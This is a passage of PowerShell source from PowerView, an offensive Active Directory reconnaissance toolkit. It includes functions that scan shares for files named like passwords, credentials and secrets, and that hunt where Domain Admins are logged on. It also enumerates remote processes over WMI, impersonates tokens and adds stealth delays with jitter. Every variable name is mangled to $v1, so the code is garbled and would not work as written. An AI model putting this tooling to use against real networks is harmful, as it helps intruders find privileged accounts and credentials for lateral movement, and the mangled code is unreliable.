                'Class' = 'StdRegProv'
                'Namespace' = 'root\default'
                'Computername' = $v1
                'ErrorAction' = 'Stop'
            }
            if ($v1['Credential']) { $v1['Credential'] = $v1 }

            try {
                $v1 = Get-WmiObject @WmiArguments


                $v1 = ($v1.EnumKey($v1, '')).sNames | Where-Object { $v1 -match 'S-1-5-21-[0-9]+-[0-9]+-[0-9]+-[0-9]+$' }

                ForEach ($v1 in $v1) {
                    try {
                        if ($v1['Credential']) {
                            $v1 = ConvertFrom-SID -ObjectSid $v1 -Credential $v1
                        }
                        else {
                            $v1 = ConvertFrom-SID -ObjectSid $v1
                        }

                        $v1 = ($v1.EnumKey($v1, "$v1\Network")).sNames

                        ForEach ($v1 in $v1) {
                            $v1 = $v1.GetStringValue($v1, "$v1\Network\$v1", 'ProviderName').sValue
                            $v1 = $v1.GetStringValue($v1, "$v1\Network\$v1", 'RemotePath').sValue
                            $v1 = $v1.GetStringValue($v1, "$v1\Network\$v1", 'UserName').sValue
                            if (-not $v1) { $v1 = '' }

                            if ($v1 -and ($v1 -ne '')) {
                                $v1 = New-Object PSObject
                                $v1 | Add-Member Noteproperty 'ComputerName' $v1
                                $v1 | Add-Member Noteproperty 'UserName' $v1
                                $v1 | Add-Member Noteproperty 'UserSID' $v1
                                $v1 | Add-Member Noteproperty 'DriveLetter' $v1
                                $v1 | Add-Member Noteproperty 'ProviderName' $v1
                                $v1 | Add-Member Noteproperty 'RemotePath' $v1
                                $v1 | Add-Member Noteproperty 'DriveUserName' $v1
                                $v1.PSObject.TypeNames.Insert(0, 'PowerView.RegMountedDrive')
                                $v1
                            }
                        }
                    }
                    catch {
                        Write-Verbose "[Get-WMIRegMountedDrive] Error: $v1"
                    }
                }
            }
            catch {
                Write-Warning "[Get-WMIRegMountedDrive] Error accessing $v1, likely insufficient permissions or firewall rules on host: $v1"
            }
        }
    }
}


function Get-WMIProcess {

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.UserProcess')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $v1, ValueFromPipelineByPropertyName = $v1)]
        [Alias('HostName', 'dnshostname', 'name')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $v1 = 'localhost',

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $v1 = [Management.Automation.PSCredential]::Empty
    )

    PROCESS {
        ForEach ($v1 in $v1) {
            try {
                $v1 = @{
                    'ComputerName' = $v1
                    'Class' = 'Win32_process'
                }
                if ($v1['Credential']) { $v1['Credential'] = $v1 }
                Get-WMIobject @WmiArguments | ForEach-Object {
                    $v1 = $v1.getowner();
                    $v1 = New-Object PSObject
                    $v1 | Add-Member Noteproperty 'ComputerName' $v1
                    $v1 | Add-Member Noteproperty 'ProcessName' $v1.ProcessName
                    $v1 | Add-Member Noteproperty 'ProcessID' $v1.ProcessID
                    $v1 | Add-Member Noteproperty 'Domain' $v1.Domain
                    $v1 | Add-Member Noteproperty 'User' $v1.User
                    $v1.PSObject.TypeNames.Insert(0, 'PowerView.UserProcess')
                    $v1
                }
            }
            catch {
                Write-Verbose "[Get-WMIProcess] Error enumerating remote processes on '$v1', access likely denied: $v1"
            }
        }
    }
}


function Find-InterestingFile {

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.FoundFile')]
    [CmdletBinding(DefaultParameterSetName = 'FileSpecification')]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $v1, ValueFromPipelineByPropertyName = $v1)]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $v1 = '.\',

        [Parameter(ParameterSetName = 'FileSpecification')]
        [ValidateNotNullOrEmpty()]
        [Alias('SearchTerms', 'Terms')]
        [String[]]
        $v1 = @('*password*', '*sensitive*', '*admin*', '*login*', '*secret*', 'unattend*.xml', '*.vmdk', '*creds*', '*credential*', '*.config'),

        [Parameter(ParameterSetName = 'FileSpecification')]
        [ValidateNotNullOrEmpty()]
        [DateTime]
        $v1,

        [Parameter(ParameterSetName = 'FileSpecification')]
        [ValidateNotNullOrEmpty()]
        [DateTime]
        $v1,

        [Parameter(ParameterSetName = 'FileSpecification')]
        [ValidateNotNullOrEmpty()]
        [DateTime]
        $v1,

        [Parameter(ParameterSetName = 'OfficeDocs')]
        [Switch]
        $v1,

        [Parameter(ParameterSetName = 'FreshEXEs')]
        [Switch]
        $v1,

        [Parameter(ParameterSetName = 'FileSpecification')]
        [Switch]
        $v1,

        [Parameter(ParameterSetName = 'FileSpecification')]
        [Switch]
        $v1,

        [Switch]
        $v1,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $v1 = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        $v1 =  @{
            'Recurse' = $v1
            'ErrorAction' = 'SilentlyContinue'
            'Include' = $v1
        }
        if ($v1['OfficeDocs']) {
            $v1['Include'] = @('*.doc', '*.docx', '*.xls', '*.xlsx', '*.ppt', '*.pptx')
        }
        elseif ($v1['FreshEXEs']) {

            $v1 = (Get-Date).AddDays(-7).ToString('MM/dd/yyyy')
            $v1['Include'] = @('*.exe')
        }
        $v1['Force'] = -not $v1['ExcludeHidden']

        $v1 = @{}

        function Test-Write {

            [CmdletBinding()]Param([String]$v1)
            try {
                $v1 = [IO.File]::OpenWrite($v1)
                $v1.Close()
                $v1
            }
            catch {
                $v1
            }
        }
    }

    PROCESS {
        ForEach ($v1 in $v1) {
            if (($v1 -Match '\\\\.*\\.*') -and ($v1['Credential'])) {
                $v1 = (New-Object System.Uri($v1)).Host
                if (-not $v1[$v1]) {

                    Add-RemoteConnection -ComputerName $v1 -Credential $v1
                    $v1[$v1] = $v1
                }
            }

            $v1['Path'] = $v1
            Get-ChildItem @SearcherArguments | ForEach-Object {

                $v1 = $v1
                if ($v1['ExcludeFolders'] -and ($v1.PSIsContainer)) {
                    Write-Verbose "Excluding: $($v1.FullName)"
                    $v1 = $v1
                }
                if ($v1 -and ($v1.LastAccessTime -lt $v1)) {
                    $v1 = $v1
                }
                if ($v1['LastWriteTime'] -and ($v1.LastWriteTime -lt $v1)) {
                    $v1 = $v1
                }
                if ($v1['CreationTime'] -and ($v1.CreationTime -lt $v1)) {
                    $v1 = $v1
                }
                if ($v1['CheckWriteAccess'] -and (-not (Test-Write -Path $v1.FullName))) {
                    $v1 = $v1
                }
                if ($v1) {
                    $v1 = @{
                        'Path' = $v1.FullName
                        'Owner' = $((Get-Acl $v1.FullName).Owner)
                        'LastAccessTime' = $v1.LastAccessTime
                        'LastWriteTime' = $v1.LastWriteTime
                        'CreationTime' = $v1.CreationTime
                        'Length' = $v1.Length
                    }
                    $v1 = New-Object -TypeName PSObject -Property $v1
                    $v1.PSObject.TypeNames.Insert(0, 'PowerView.FoundFile')
                    $v1
                }
            }
        }
    }

    END {

        $v1.Keys | Remove-RemoteConnection
    }
}








function New-ThreadedFunction {

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseShouldProcessForStateChangingFunctions', '')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, Mandatory = $v1, ValueFromPipeline = $v1, ValueFromPipelineByPropertyName = $v1)]
        [String[]]
        $v1,

        [Parameter(Position = 1, Mandatory = $v1)]
        [System.Management.Automation.ScriptBlock]
        $v1,

        [Parameter(Position = 2)]
        [Hashtable]
        $v1,

        [Int]
        [ValidateRange(1,  100)]
        $v1 = 20,

        [Switch]
        $v1
    )

    BEGIN {


        $v1 = [System.Management.Automation.Runspaces.InitialSessionState]::CreateDefault()



        $v1.ApartmentState = [System.Threading.ApartmentState]::STA



        if (-not $v1) {

            $v1 = Get-Variable -Scope 2


            $v1 = @('?','args','ConsoleFileName','Error','ExecutionContext','false','HOME','Host','input','InputObject','MaximumAliasCount','MaximumDriveCount','MaximumErrorCount','MaximumFunctionCount','MaximumHistoryCount','MaximumVariableCount','MyInvocation','null','PID','PSBoundParameters','PSCommandPath','PSCulture','PSDefaultParameterValues','PSHOME','PSScriptRoot','PSUICulture','PSVersionTable','PWD','ShellId','SynchronizedHash','true')


            ForEach ($v1 in $v1) {
                if ($v1 -NotContains $v1.Name) {
                $v1.Variables.Add((New-Object -TypeName System.Management.Automation.Runspaces.SessionStateVariableEntry -ArgumentList $v1.name,$v1.Value,$v1.description,$v1.options,$v1.attributes))
                }
            }


            ForEach ($v1 in (Get-ChildItem Function:)) {
                $v1.Commands.Add((New-Object -TypeName System.Management.Automation.Runspaces.SessionStateFunctionEntry -ArgumentList $v1.Name, $v1.Definition))
            }
        }






        $v1 = [RunspaceFactory]::CreateRunspacePool(1, $v1, $v1, $v1)
        $v1.Open()


        $v1 = $v1
        ForEach ($v1 in [PowerShell].GetMethods() | Where-Object { $v1.Name -eq 'BeginInvoke' }) {
            $v1 = $v1.GetParameters()
            if (($v1.Count -eq 2) -and $v1[0].Name -eq 'input' -and $v1[1].Name -eq 'output') {
                $v1 = $v1.MakeGenericMethod([Object], [Object])
                break
            }
        }

        $v1 = @()
        $v1 = $v1 | Where-Object {$v1 -and $v1.Trim()}
        Write-Verbose "[New-ThreadedFunction] Total number of hosts: $($v1.count)"


        if ($v1 -ge $v1.Length) {
            $v1 = $v1.Length
        }
        $v1 = [Int]($v1.Length/$v1)
        $v1 = @()
        $v1 = 0
        $v1 = $v1

        for($v1 = 1; $v1 -le $v1; $v1++) {
            $v1 = New-Object System.Collections.ArrayList
            if ($v1 -eq $v1) {
                $v1 = $v1.Length
            }
            $v1.AddRange($v1[$v1..($v1-1)])
            $v1 += $v1
            $v1 += $v1
            $v1 += @(,@($v1.ToArray()))
        }

        Write-Verbose "[New-ThreadedFunction] Total number of threads/partitions: $v1"

        ForEach ($v1 in $v1) {

            $v1 = [PowerShell]::Create()
            $v1.runspacepool = $v1


            $v1 = $v1.AddScript($v1).AddParameter('ComputerName', $v1)
            if ($v1) {
                ForEach ($v1 in $v1.GetEnumerator()) {
                    $v1 = $v1.AddParameter($v1.Name, $v1.Value)
                }
            }


            $v1 = New-Object Management.Automation.PSDataCollection[Object]


            $v1 += @{
                PS = $v1
                Output = $v1
                Result = $v1.Invoke($v1, @($v1, [Management.Automation.PSDataCollection[Object]]$v1))
            }
        }
    }

    END {
        Write-Verbose "[New-ThreadedFunction] Threads executing"


        Do {
            ForEach ($v1 in $v1) {
                $v1.Output.ReadAll()
            }
            Start-Sleep -Seconds 1
        }
        While (($v1 | Where-Object { -not $v1.Result.IsCompleted }).Count -gt 0)

        $v1 = 100
        Write-Verbose "[New-ThreadedFunction] Waiting $v1 seconds for final cleanup..."


        for ($v1=0; $v1 -lt $v1; $v1++) {
            ForEach ($v1 in $v1) {
                $v1.Output.ReadAll()
                $v1.PS.Dispose()
            }
            Start-Sleep -S 1
        }

        $v1.Dispose()
        Write-Verbose "[New-ThreadedFunction] all threads completed"
    }
}


function Find-DomainUserLocation {

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.UserLocation')]
    [CmdletBinding(DefaultParameterSetName = 'UserGroupIdentity')]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $v1, ValueFromPipelineByPropertyName = $v1)]
        [Alias('DNSHostName')]
        [String[]]
        $v1,

        [ValidateNotNullOrEmpty()]
        [String]
        $v1,

        [ValidateNotNullOrEmpty()]
        [String]
        $v1,

        [ValidateNotNullOrEmpty()]
        [String]
        $v1,

        [ValidateNotNullOrEmpty()]
        [String]
        $v1,

        [Alias('Unconstrained')]
        [Switch]
        $v1,

        [ValidateNotNullOrEmpty()]
        [Alias('OperatingSystem')]
        [String]
        $v1,

        [ValidateNotNullOrEmpty()]
        [Alias('ServicePack')]
        [String]
        $v1,

        [ValidateNotNullOrEmpty()]
        [Alias('SiteName')]
        [String]
        $v1,

        [Parameter(ParameterSetName = 'UserIdentity')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $v1,

        [ValidateNotNullOrEmpty()]
        [String]
        $v1,

        [ValidateNotNullOrEmpty()]
        [String]
        $v1,

        [ValidateNotNullOrEmpty()]
        [String]
        $v1,

        [Parameter(ParameterSetName = 'UserGroupIdentity')]
        [ValidateNotNullOrEmpty()]
        [Alias('GroupName', 'Group')]
        [String[]]
        $v1 = 'Domain Admins',

        [Alias('AdminCount')]
        [Switch]
        $v1,

        [Alias('AllowDelegation')]
        [Switch]
        $v1,

        [Switch]
        $v1,

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $v1,

        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $v1 = 'Subtree',

        [ValidateRange(1, 10000)]
        [Int]
        $v1 = 200,

        [ValidateRange(1, 10000)]
        [Int]
        $v1,

        [Switch]
        $v1,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $v1 = [Management.Automation.PSCredential]::Empty,

        [Switch]
        $v1,

        [ValidateRange(1, 10000)]
        [Int]
        $v1 = 0,

        [ValidateRange(0.0, 1.0)]
        [Double]
        $v1 = .3,

        [Parameter(ParameterSetName = 'ShowAll')]
        [Switch]
        $v1,

        [Switch]
        $v1,

        [String]
        [ValidateSet('DFS', 'DC', 'File', 'All')]
        $v1 = 'All',

        [Int]
        [ValidateRange(1, 100)]
        $v1 = 20
    )

    BEGIN {

        $v1 = @{
            'Properties' = 'dnshostname'
        }
        if ($v1['Domain']) { $v1['Domain'] = $v1 }
        if ($v1['ComputerDomain']) { $v1['Domain'] = $v1 }
        if ($v1['ComputerLDAPFilter']) { $v1['LDAPFilter'] = $v1 }
        if ($v1['ComputerSearchBase']) { $v1['SearchBase'] = $v1 }
        if ($v1['Unconstrained']) { $v1['Unconstrained'] = $v1 }
        if ($v1['ComputerOperatingSystem']) { $v1['OperatingSystem'] = $v1 }
        if ($v1['ComputerServicePack']) { $v1['ServicePack'] = $v1 }
        if ($v1['ComputerSiteName']) { $v1['SiteName'] = $v1 }
        if ($v1['Server']) { $v1['Server'] = $v1 }
        if ($v1['SearchScope']) { $v1['SearchScope'] = $v1 }
        if ($v1['ResultPageSize']) { $v1['ResultPageSize'] = $v1 }
        if ($v1['ServerTimeLimit']) { $v1['ServerTimeLimit'] = $v1 }
        if ($v1['Tombstone']) { $v1['Tombstone'] = $v1 }
        if ($v1['Credential']) { $v1['Credential'] = $v1 }

        $v1 = @{
            'Properties' = 'samaccountname'
        }
        if ($v1['UserIdentity']) { $v1['Identity'] = $v1 }
        if ($v1['Domain']) { $v1['Domain'] = $v1 }
        if ($v1['UserDomain']) { $v1['Domain'] = $v1 }
        if ($v1['UserLDAPFilter']) { $v1['LDAPFilter'] = $v1 }
        if ($v1['UserSearchBase']) { $v1['SearchBase'] = $v1 }
        if ($v1['UserAdminCount']) { $v1['AdminCount'] = $v1 }
        if ($v1['UserAllowDelegation']) { $v1['AllowDelegation'] = $v1 }
        if ($v1['Server']) { $v1['Server'] = $v1 }
        if ($v1['SearchScope']) { $v1['SearchScope'] = $v1 }
        if ($v1['ResultPageSize']) { $v1['ResultPageSize'] = $v1 }
        if ($v1['ServerTimeLimit']) { $v1['ServerTimeLimit'] = $v1 }
        if ($v1['Tombstone']) { $v1['Tombstone'] = $v1 }
        if ($v1['Credential']) { $v1['Credential'] = $v1 }

        $v1 = @()


        if ($v1['ComputerName']) {
            $v1 = @($v1)
        }
        else {
            if ($v1['Stealth']) {
                Write-Verbose "[Find-DomainUserLocation] Stealth enumeration using source: $v1"
                $v1 = New-Object System.Collections.ArrayList

                if ($v1 -match 'File|All') {
                    Write-Verbose '[Find-DomainUserLocation] Querying for file servers'
                    $v1 = @{}
                    if ($v1['Domain']) { $v1['Domain'] = $v1 }
                    if ($v1['ComputerDomain']) { $v1['Domain'] = $v1 }
                    if ($v1['ComputerSearchBase']) { $v1['SearchBase'] = $v1 }
                    if ($v1['Server']) { $v1['Server'] = $v1 }
                    if ($v1['SearchScope']) { $v1['SearchScope'] = $v1 }
                    if ($v1['ResultPageSize']) { $v1['ResultPageSize'] = $v1 }
                    if ($v1['ServerTimeLimit']) { $v1['ServerTimeLimit'] = $v1 }
                    if ($v1['Tombstone']) { $v1['Tombstone'] = $v1 }
                    if ($v1['Credential']) { $v1['Credential'] = $v1 }
                    $v1 = Get-DomainFileServer @FileServerSearcherArguments
                    if ($v1 -isnot [System.Array]) { $v1 = @($v1) }
                    $v1.AddRange( $v1 )
                }
                if ($v1 -match 'DFS|All') {
                    Write-Verbose '[Find-DomainUserLocation] Querying for DFS servers'


                }
                if ($v1 -match 'DC|All') {
                    Write-Verbose '[Find-DomainUserLocation] Querying for domain controllers'
                    $v1 = @{
                        'LDAP' = $v1
                    }
                    if ($v1['Domain']) { $v1['Domain'] = $v1 }
                    if ($v1['ComputerDomain']) { $v1['Domain'] = $v1 }
                    if ($v1['Server']) { $v1['Server'] = $v1 }
                    if ($v1['Credential']) { $v1['Credential'] = $v1 }
                    $v1 = Get-DomainController @DCSearcherArguments | Select-Object -ExpandProperty dnshostname
                    if ($v1 -isnot [System.Array]) { $v1 = @($v1) }
                    $v1.AddRange( $v1 )
                }
                $v1 = $v1.ToArray()
            }
            else {
                Write-Verbose '[Find-DomainUserLocation] Querying for all computers in the domain'
                $v1 = Get-DomainComputer @ComputerSearcherArguments | Select-Object -ExpandProperty dnshostname
            }
        }
        Write-Verbose "[Find-DomainUserLocation] TargetComputers length: $($v1.Length)"
        if ($v1.Length -eq 0) {
            throw '[Find-DomainUserLocation] No hosts found to enumerate'
        }


        if ($v1['Credential']) {
            $v1 = $v1.GetNetworkCredential().UserName
        }
        else {
            $v1 = ([Environment]::UserName).ToLower()
        }


        if ($v1['ShowAll']) {
            $v1 = @()
        }
        elseif ($v1['UserIdentity'] -or $v1['UserLDAPFilter'] -or $v1['UserSearchBase'] -or $v1['UserAdminCount'] -or $v1['UserAllowDelegation']) {
            $v1 = Get-DomainUser @UserSearcherArguments | Select-Object -ExpandProperty samaccountname
        }
        else {
            $v1 = @{
                'Identity' = $v1
                'Recurse' = $v1
            }
            if ($v1['UserDomain']) { $v1['Domain'] = $v1 }
            if ($v1['UserSearchBase']) { $v1['SearchBase'] = $v1 }
            if ($v1['Server']) { $v1['Server'] = $v1 }
            if ($v1['SearchScope']) { $v1['SearchScope'] = $v1 }
            if ($v1['ResultPageSize']) { $v1['ResultPageSize'] = $v1 }
            if ($v1['ServerTimeLimit']) { $v1['ServerTimeLimit'] = $v1 }
            if ($v1['Tombstone']) { $v1['Tombstone'] = $v1 }
            if ($v1['Credential']) { $v1['Credential'] = $v1 }
            $v1 = Get-DomainGroupMember @GroupSearcherArguments | Select-Object -ExpandProperty MemberName
        }

        Write-Verbose "[Find-DomainUserLocation] TargetUsers length: $($v1.Length)"
        if ((-not $v1) -and ($v1.Length -eq 0)) {
            throw '[Find-DomainUserLocation] No users found to target'
        }


        $v1 = {
            Param($v1, $v1, $v1, $v1, $v1)

            if ($v1) {

                $v1 = Invoke-UserImpersonation -TokenHandle $v1 -Quiet
            }

            ForEach ($v1 in $v1) {
                $v1 = Test-Connection -Count 1 -Quiet -ComputerName $v1
                if ($v1) {
                    $v1 = Get-NetSession -ComputerName $v1
                    ForEach ($v1 in $v1) {
                        $v1 = $v1.UserName
                        $v1 = $v1.CName

                        if ($v1 -and $v1.StartsWith('\\')) {
                            $v1 = $v1.TrimStart('\')
                        }


                        if (($v1) -and ($v1.Trim() -ne '') -and ($v1 -notmatch $v1) -and ($v1 -notmatch '\$$')) {

                            if ( (-not $v1) -or ($v1 -contains $v1)) {
                                $v1 = New-Object PSObject
                                $v1 | Add-Member Noteproperty 'UserDomain' $v1
                                $v1 | Add-Member Noteproperty 'UserName' $v1
                                $v1 | Add-Member Noteproperty 'ComputerName' $v1
                                $v1 | Add-Member Noteproperty 'SessionFrom' $v1


                                try {
                                    $v1 = [System.Net.Dns]::GetHostEntry($v1) | Select-Object -ExpandProperty HostName
                                    $v1 | Add-Member NoteProperty 'SessionFromName' $v1
                                }
                                catch {
                                    $v1 | Add-Member NoteProperty 'SessionFromName' $v1
                                }


                                if ($v1) {
                                    $v1 = (Test-AdminAccess -ComputerName $v1).IsAdmin
                                    $v1 | Add-Member Noteproperty 'LocalAdmin' $v1.IsAdmin
                                }
                                else {
                                    $v1 | Add-Member Noteproperty 'LocalAdmin' $v1
                                }
                                $v1.PSObject.TypeNames.Insert(0, 'PowerView.UserLocation')
                                $v1
                            }
                        }
                    }
                    if (-not $v1) {

                        $v1 = Get-NetLoggedon -ComputerName $v1
                        ForEach ($v1 in $v1) {
                            $v1 = $v1.UserName
                            $v1 = $v1.LogonDomain


                            if (($v1) -and ($v1.trim() -ne '')) {
                                if ( (-not $v1) -or ($v1 -contains $v1) -and ($v1 -notmatch '\$$')) {
                                    $v1 = @(Resolve-IPAddress -ComputerName $v1)[0].IPAddress
                                    $v1 = New-Object PSObject
                                    $v1 | Add-Member Noteproperty 'UserDomain' $v1
                                    $v1 | Add-Member Noteproperty 'UserName' $v1
                                    $v1 | Add-Member Noteproperty 'ComputerName' $v1
                                    $v1 | Add-Member Noteproperty 'IPAddress' $v1
                                    $v1 | Add-Member Noteproperty 'SessionFrom' $v1
                                    $v1 | Add-Member Noteproperty 'SessionFromName' $v1


                                    if ($v1) {
                                        $v1 = Test-AdminAccess -ComputerName $v1
                                        $v1 | Add-Member Noteproperty 'LocalAdmin' $v1.IsAdmin
                                    }
                                    else {
                                        $v1 | Add-Member Noteproperty 'LocalAdmin' $v1
                                    }
                                    $v1.PSObject.TypeNames.Insert(0, 'PowerView.UserLocation')
                                    $v1
                                }
                            }
                        }
                    }
                }
            }

            if ($v1) {
                Invoke-RevertToSelf
            }
        }

        $v1 = $v1
        if ($v1['Credential']) {
            if ($v1['Delay'] -or $v1['StopOnSuccess']) {
                $v1 = Invoke-UserImpersonation -Credential $v1
            }
            else {
                $v1 = Invoke-UserImpersonation -Credential $v1 -Quiet
            }
        }
    }

    PROCESS {

        if ($v1['Delay'] -or $v1['StopOnSuccess']) {

            Write-Verbose "[Find-DomainUserLocation] Total number of hosts: $($v1.count)"
            Write-Verbose "[Find-DomainUserLocation] Delay: $v1, Jitter: $v1"
            $v1 = 0
            $v1 = New-Object System.Random

            ForEach ($v1 in $v1) {
                $v1 = $v1 + 1


                Start-Sleep -Seconds $v1.Next((1-$v1)*$v1, (1+$v1)*$v1)

                Write-Verbose "[Find-DomainUserLocation] Enumerating server $v1 ($v1 of $($v1.Count))"
                Invoke-Command -ScriptBlock $v1 -ArgumentList $v1, $v1, $v1, $v1, $v1

                if ($v1 -and $v1) {
                    Write-Verbose "[Find-DomainUserLocation] Target user found, returning early"
                    return
                }
            }
        }
        else {
            Write-Verbose "[Find-DomainUserLocation] Using threading with threads: $v1"
            Write-Verbose "[Find-DomainUserLocation] TargetComputers length: $($v1.Length)"


            $v1 = @{
                'TargetUsers' = $v1
                'CurrentUser' = $v1
                'Stealth' = $v1
                'TokenHandle' = $v1
            }


            New-ThreadedFunction -ComputerName $v1 -ScriptBlock $v1 -ScriptParameters $v1 -Threads $v1
        }
    }

    END {
        if ($v1) {
            Invoke-RevertToSelf -TokenHandle $v1
        }
    }
}


function Find-DomainProcess {

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUsePSCredentialType', '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSAvoidUsingPlainTextForPassword', '')]
    [OutputType('PowerView.UserProcess')]
    [CmdletBinding(DefaultParameterSetName = 'None')]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $v1, ValueFromPipelineByPropertyName = $v1)]
        [Alias('DNSHostName')]
        [String[]]
        $v1,

        [ValidateNotNullOrEmpty()]
        [String]
        $v1,

        [ValidateNotNullOrEmpty()]
        [String]
        $v1,

        [ValidateNotNullOrEmpty()]
        [String]
        $v1,

        [ValidateNotNullOrEmpty()]
        [String]
        $v1,

        [Alias('Unconstrained')]
        [Switch]
        $v1,

        [ValidateNotNullOrEmpty()]
        [Alias('OperatingSystem')]
        [String]
        $v1,

        [ValidateNotNullOrEmpty()]
        [Alias('ServicePack')]
        [String]
        $v1,

        [ValidateNotNullOrEmpty()]
        [Alias('SiteName')]
        [String]
        $v1,

        [Parameter(ParameterSetName = 'TargetProcess')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $v1,

        [Parameter(ParameterSetName = 'TargetUser')]
        [Parameter(ParameterSetName = 'UserIdentity')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $v1,

        [Parameter(ParameterSetName = 'TargetUser')]
        [ValidateNotNullOrEmpty()]
        [String]
        $v1,

        [Parameter(ParameterSetName = 'TargetUser')]
        [ValidateNotNullOrEmpty()]
        [String]
        $v1,

        [Parameter(ParameterSetName = 'TargetUser')]
        [ValidateNotNullOrEmpty()]
        [String]
        $v1,

        [ValidateNotNullOrEmpty()]
        [Alias('GroupName', 'Group')]
        [String[]]
        $v1 = 'Domain Admins',

        [Parameter(ParameterSetName = 'TargetUser')]
        [Alias('AdminCount')]
        [Switch]
        $v1,

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $v1,

        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $v1 = 'Subtree',

        [ValidateRange(1, 10000)]
        [Int]
        $v1 = 200,

        [ValidateRange(1, 10000)]
        [Int]
        $v1,

        [Switch]
        $v1,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $v1 = [Management.Automation.PSCredential]::Empty,

        [Switch]
        $v1,

        [ValidateRange(1, 10000)]
        [Int]
        $v1 = 0,

        [ValidateRange(0.0, 1.0)]
        [Double]
        $v1 = .3,

        [Int]
        [ValidateRange(1, 100)]
        $v1 = 20
    )

    BEGIN {
        $v1 = @{
            'Properties' = 'dnshostname'
        }
        if ($v1['Domain']) { $v1['Domain'] = $v1 }
        if ($v1['ComputerDomain']) { $v1['Domain'] = $v1 }
        if ($v1['ComputerLDAPFilter']) { $v1['LDAPFilter'] = $v1 }
        if ($v1['ComputerSearchBase']) { $v1['SearchBase'] = $v1 }
        if ($v1['Unconstrained']) { $v1['Unconstrained'] = $v1 }
        if ($v1['ComputerOperatingSystem']) { $v1['OperatingSystem'] = $v1 }
        if ($v1['ComputerServicePack']) { $v1['ServicePack'] = $v1 }
        if ($v1['ComputerSiteName']) { $v1['SiteName'] = $v1 }
        if ($v1['Server']) { $v1['Server'] = $v1 }
        if ($v1['SearchScope']) { $v1['SearchScope'] = $v1 }
        if ($v1['ResultPageSize']) { $v1['ResultPageSize'] = $v1 }
        if ($v1['ServerTimeLimit']) { $v1['ServerTimeLimit'] = $v1 }
        if ($v1['Tombstone']) { $v1['Tombstone'] = $v1 }
        if ($v1['Credential']) { $v1['Credential'] = $v1 }

        $v1 = @{
            'Properties' = 'samaccountname'
        }
        if ($v1['UserIdentity']) { $v1['Identity'] = $v1 }
        if ($v1['Domain']) { $v1['Domain'] = $v1 }
        if ($v1['UserDomain']) { $v1['Domain'] = $v1 }
        if ($v1['UserLDAPFilter']) { $v1['LDAPFilter'] = $v1 }
        if ($v1['UserSearchBase']) { $v1['SearchBase'] = $v1 }
        if ($v1['UserAdminCount']) { $v1['AdminCount'] = $v1 }
        if ($v1['Server']) { $v1['Server'] = $v1 }
        if ($v1['SearchScope']) { $v1['SearchScope'] = $v1 }
        if ($v1['ResultPageSize']) { $v1['ResultPageSize'] = $v1 }
        if ($v1['ServerTimeLimit']) { $v1['ServerTimeLimit'] = $v1 }
        if ($v1['Tombstone']) { $v1['Tombstone'] = $v1 }
        if ($v1['Credential']) { $v1['Credential'] = $v1 }



        if ($v1['ComputerName']) {
            $v1 = $v1
        }
        else {
            Write-Verbose '[Find-DomainProcess] Querying computers in the domain'
            $v1 = Get-DomainComputer @ComputerSearcherArguments | Select-Object -ExpandProperty dnshostname
        }
        Write-Verbose "[Find-DomainProcess] TargetComputers length: $($v1.Length)"
        if ($v1.Length -eq 0) {
            throw '[Find-DomainProcess] No hosts found to enumerate'
        }


        if ($v1['ProcessName']) {
            $v1 = @()
            ForEach ($v1 in $v1) {
                $v1 += $v1.Split(',')
            }
            if ($v1 -isnot [System.Array]) {
                $v1 = [String[]] @($v1)
            }
        }
        elseif ($v1['UserIdentity'] -or $v1['UserLDAPFilter'] -or $v1['UserSearchBase'] -or $v1['UserAdminCount'] -or $v1['UserAllowDelegation']) {
            $v1 = Get-DomainUser @UserSearcherArguments | Select-Object -ExpandProperty samaccountname
        }
        else {
            $v1 = @{
                'Identity' = $v1
                'Recurse' = $v1
            }
            if ($v1['UserDomain']) { $v1['Domain'] = $v1 }
            if ($v1['UserSearchBase']) { $v1['SearchBase'] = $v1 }
            if ($v1['Server']) { $v1['Server'] = $v1 }
            if ($v1['SearchScope']) { $v1['SearchScope'] = $v1 }
            if ($v1['ResultPageSize']) { $v1['ResultPageSize'] = $v1 }
            if ($v1['ServerTimeLimit']) { $v1['ServerTimeLimit'] = $v1 }
            if ($v1['Tombstone']) { $v1['Tombstone'] = $v1 }
            if ($v1['Credential']) { $v1['Credential'] = $v1 }
            $v1
            $v1 = Get-DomainGroupMember @GroupSearcherArguments | Select-Object -ExpandProperty MemberName
        }


        $v1 = {
            Param($v1, $v1, $v1, $v1)

            ForEach ($v1 in $v1) {
                $v1 = Test-Connection -Count 1 -Quiet -ComputerName $v1
                if ($v1) {


                    if ($v1) {
                        $v1 = Get-WMIProcess -Credential $v1 -ComputerName $v1 -ErrorAction SilentlyContinue
                    }
                    else {
                        $v1 = Get-WMIProcess -ComputerName $v1 -ErrorAction SilentlyContinue
                    }
                    ForEach ($v1 in $v1) {

                        if ($v1) {
                            if ($v1 -Contains $v1.ProcessName) {
